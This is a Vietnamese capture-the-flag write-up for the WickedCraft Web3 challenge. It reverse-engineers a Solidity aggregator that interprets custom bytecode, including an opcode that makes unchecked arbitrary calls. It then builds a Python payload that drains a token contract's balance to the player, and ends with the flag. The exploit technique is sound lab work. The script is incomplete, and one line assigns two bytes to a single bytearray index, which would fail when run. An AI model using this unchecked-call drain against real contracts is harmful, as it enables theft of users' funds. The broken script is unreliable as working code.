# WickedCraft

**Category:** Web3  
**Author:** ReiKage  
**Team:** 6h4T9pTpR0  

## Lời nói đầu
Đây là một bài Reverse Engineering (Dịch ngược) trên nền tảng Smart Contract khá là "khoai". Thay vì tìm lỗi logic thông thường, chúng ta phải đối mặt với một cái **Custom Virtual Machine (VM)** được viết bằng Solidity. Tưởng tượng như người ta viết một ngôn ngữ lập trình riêng, rồi bắt mình hack nó vậy. Nhưng mà "khó quá thì bỏ qua" không có trong từ điển của team mình, nên chiến thôi!

## 1. Phân tích & Reconnaissance

Đề bài cho một contract tên là `Aggregator`. Nhìn vào hàm `swap(bytes memory data)`, mình thấy nó nhận vào một chuỗi bytes dài ngoằng và xử lý nó trong một vòng lặp `while`.

```solidity
// Pseudo-code mô phỏng lại logic
while (cursor < data.length) {
    uint8 action = data[cursor];
    if (action == 0) { ... }
    else if (action == 1) { ... }
    // ...
}
```

Đây chính là dấu hiệu của một trình thông dịch bytecode (Interpreter). Nhiệm vụ của mình là phải hiểu từng cái `action` (opcode) nó làm cái gì.

### Giải mã Bytecode (Reverse Engineering)
Sau một hồi ngồi đọc code và debug bằng `remix` hoặc `hardhat`, mình đã map được các opcode quan trọng:

*   **Header (76 bytes đầu):** Chứa các thông tin cấu hình như vị trí bắt đầu lệnh, vị trí output, deadline... Cái này quan trọng lắm, sai một byte là revert ngay.
*   **Action 0 (CALL):** Đây là "trùm cuối". Nó thực hiện lệnh `call` low-level tới một địa chỉ bất kỳ.
    *   Cấu trúc: `[ActionID (1 byte)] ... [Target Address Offset] ...`
    *   Nguy hiểm ở chỗ: Nó **không kiểm tra** địa chỉ đích là ai. Mình có thể bảo nó gọi tới bất cứ đâu!
*   **Action 4 (MULTICALL):** Cho phép thực hiện nhiều lệnh cùng lúc.

## 2. Chiến thuật tấn công (Exploitation Strategy)

Mục tiêu của mình là lấy tiền từ contract `WannaCoin`. Contract `Aggregator` (cái VM này) có quyền điều khiển tiền hoặc là owner của `WannaCoin`.

Ý tưởng là: **Soạn một đoạn bytecode độc hại, gửi cho `Aggregator` chạy. Đoạn code này sẽ ra lệnh cho `Aggregator` gọi hàm `transfer` của `WannaCoin` để chuyển hết tiền về ví mình.**

Các bước cụ thể:
1.  **Tính toán Offsets:** Cái VM này dùng memory offset (địa chỉ bộ nhớ) rất nhiều. Mình phải tính toán chính xác xem địa chỉ của `WannaCoin` nằm ở byte thứ bao nhiêu trong payload, lệnh `transfer` nằm ở đâu.
2.  **Xây dựng Header:** Tạo 76 bytes đầu tiên thật chuẩn để VM không bị crash (Out of Bounds).
3.  **Inject Action 0:** Chèn lệnh CALL vào.
    - Target: Địa chỉ `WannaCoin`.
    - Data: `abi.encodeWithSignature("transfer(address,uint256)", player, balance)`.

## 3. Viết Tool & Script

Phần này cần sự tỉ mỉ cao độ. Sai 1 byte là đi tong. Mình dùng Python để thao tác với bytes cho dễ.

### Script tạo Payload (`solve_wicked.py`)

```python
from web3 import Web3

# ... setup web3 ...

def construct_payload(target_address, player_address):
    # Khởi tạo mảng bytes rỗng, kích thước đủ lớn
    payload_size = 512
    B = bytearray(payload_size)
    
    # --- 1. Xây dựng Header ---
    # Các giá trị này mình tìm ra được sau khi debug
    cmd_start = 0x60 # Vị trí bắt đầu lệnh
    
    # Ghi vào 2 byte đầu tiên: Vị trí bắt đầu lệnh
    # Lưu ý: VM này đọc số theo kiểu Big Endian
    B[0:2] = (cmd_start - 2).to_bytes(2, 'big')
    
    # ... (Set các offset khác cho deadline, output để tránh lỗi) ...
    
    # --- 2. Chèn dữ liệu Call ---
    # Mình cần để địa chỉ WannaCoin và data transfer ở đâu đó trong payload
    # Giả sử mình để ở cuối payload cho gọn
    target_addr_offset = 0x100 
    
    # Ghi địa chỉ WannaCoin vào vị trí target_addr_offset
    # (Cần convert address string sang bytes)
    target_bytes = bytes.fromhex(target_address[2:])
    B[target_addr_offset : target_addr_offset + 20] = target_bytes
    
    # --- 3. Soạn lệnh Action 0 (CALL) ---
    cursor = cmd_start
    
    B[cursor] = 0 # Opcode 0: CALL
    
    # Chỉ định vị trí của Target Address cho lệnh CALL
    # VM nó cộng thêm 68 bytes header gì đó nên mình phải tính bù trừ
    B[cursor+8] = (target_addr_offset + 68).to_bytes(2, 'big')
    
    return bytes(B)

print(">>> Đang tạo payload độc hại...")
payload = construct_payload(wannacoin_address, my_address)

print(">>> Gửi payload vào hàm swap...")
tx = aggregator.functions.swap(payload).build_transaction({
    'from': my_address,
    'gas': 5000000
})
# Ký và gửi...
```

### Lưu ý khi làm bài này
*   **Debug là chân ái:** Mình phải dùng `console.log` trong Hardhat hoặc xem Trace của transaction liên tục để biết tại sao nó revert. Thường là do tính sai offset 1-2 bytes.
*   **Đọc kỹ code Assembly:** Đôi khi code Solidity nó dùng `assembly { ... }` để load dữ liệu, mình phải hiểu nó load 32 bytes hay bao nhiêu để tính offset cho đúng.

## Kết quả
Khi transaction thành công, `Aggregator` sẽ ngoan ngoãn nghe lời và chuyển toàn bộ số dư `WannaCoin` sang ví mình.

**Flag:** `W1{THIS-1s_wIcKeDCraft-CHAlL3nge_fLAG5060}`
